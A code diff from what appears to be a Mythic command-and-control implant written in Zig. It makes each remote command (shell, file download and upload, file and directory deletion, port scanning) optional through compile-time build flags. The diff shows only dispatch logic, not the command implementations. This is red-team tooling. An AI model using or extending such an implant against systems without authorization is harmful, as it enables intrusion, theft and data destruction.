@@ -1,5 +1,6 @@
 const std = @import("std");
 const builtin = @import("builtin");
+const build_options = @import("build_options");
 const types = @import("types.zig");
 const json = std.json;
 const base64 = std.base64;
@@ -22,32 +23,57 @@ pub const CommandExecutor = struct {
     }
 
     pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        if (std.mem.eql(u8, task.command, "shell")) {
-            return try self.executeShell(task);
-        } else if (std.mem.eql(u8, task.command, "pwd")) {
-            return try self.executePwd(task);
-        } else if (std.mem.eql(u8, task.command, "ls")) {
-            return try self.executeLs(task);
-        } else if (std.mem.eql(u8, task.command, "cat")) {
-            return try self.executeCat(task);
-        } else if (std.mem.eql(u8, task.command, "download")) {
-            return try self.executeDownload(task);
-        } else if (std.mem.eql(u8, task.command, "upload")) {
-            return try self.executeUpload(task);
-        } else if (std.mem.eql(u8, task.command, "deletefile")) {
-            return try self.deleteFile(task);
-        } else if (std.mem.eql(u8, task.command, "deletedirectory")) {
-            return try self.deleteDirectory(task);
-        } else if (std.mem.eql(u8, task.command, "portscan")) {
-            return try self.executePortscan(task);
-        } else {
-            return MythicResponse{
+        if (comptime build_options.shell) {
+            if (std.mem.eql(u8, task.command, "shell")) {
+                return try self.executeShell(task);
+            }
+        }
+        if (comptime build_options.pwd) {
+            if (std.mem.eql(u8, task.command, "pwd")) {
+                return try self.executePwd(task);
+            }
+        }
+        if (comptime build_options.ls) {
+            if (std.mem.eql(u8, task.command, "ls")) {
+                return try self.executeLs(task);
+            }
+        }
+        if (comptime build_options.cat) {
+            if (std.mem.eql(u8, task.command, "cat")) {
+                return try self.executeCat(task);
+            }
+        }
+        if (comptime build_options.download) {
+            if (std.mem.eql(u8, task.command, "download")) {
+                return try self.executeDownload(task);
+            }
+        }
+        if (comptime build_options.upload) {
+            if (std.mem.eql(u8, task.command, "upload")) {
+                return try self.executeUpload(task);
+            }
+        }
+        if (comptime build_options.deletefile) {
+            if (std.mem.eql(u8, task.command, "deletefile")) {
+                return try self.deleteFile(task);
+            }
+        }
+        if (comptime build_options.deletedirectory) {
+            if (std.mem.eql(u8, task.command, "deletedirectory")) {
+                return try self.deleteDirectory(task);
+            }
+        }
+        if (comptime build_options.portscan) {
+            if (std.mem.eql(u8, task.command, "portscan")) {
+                return try self.executePortscan(task);
+            }
+        }
+        return MythicResponse {
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{s}", .{task.command}),
                 .completed = true,
                 .status = "error",
-            };
-        }
+        };
     }
 
     fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
